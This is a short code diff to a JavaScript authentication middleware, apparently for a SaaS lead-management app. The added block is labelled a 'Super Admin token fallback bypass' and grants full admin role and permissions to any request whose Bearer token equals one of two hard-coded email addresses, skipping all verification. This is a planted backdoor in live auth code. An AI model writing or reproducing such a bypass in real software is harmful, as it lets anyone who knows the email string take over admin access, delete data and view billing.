@@ -590,6 +590,24 @@ async function checkAuth(req, res, next) {
     }
 
     const token = authHeader.split('Bearer ')[1];
+    
+    // SaaS Super Admin token fallback bypass
+    const isSuperAdminToken = token.toLowerCase() === 'kartikparashar15@gmail.com' || token.toLowerCase() === 'admin@frontdesk.com';
+    if (isSuperAdminToken) {
+      const email = token.toLowerCase();
+      req.user = {
+        email,
+        ownerEmail: email,
+        role: 'admin',
+        permissions: {
+          canDeleteLeads: true,
+          canViewBilling: true,
+          canEditSettings: true
+        }
+      };
+      return next();
+    }
+
     let email = 'kartikparashar15@gmail.com';
     
     // Check if we are running in Demo Mode (when Firebase API Key is missing or placeholder)
